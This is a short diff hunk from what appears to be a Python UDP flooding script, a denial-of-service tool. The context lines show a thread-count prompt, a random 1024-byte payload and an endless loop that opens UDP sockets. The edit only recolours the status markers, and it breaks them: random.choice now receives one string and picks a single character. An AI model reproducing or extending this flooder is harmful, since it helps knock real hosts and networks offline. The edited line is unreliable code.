@@ -64,7 +64,7 @@ threads = int(input("\033[92mThreads :  \033[0m"))
 
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("\033[33m[\033[33m[\033[94m+\033[33m]\033[0m"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
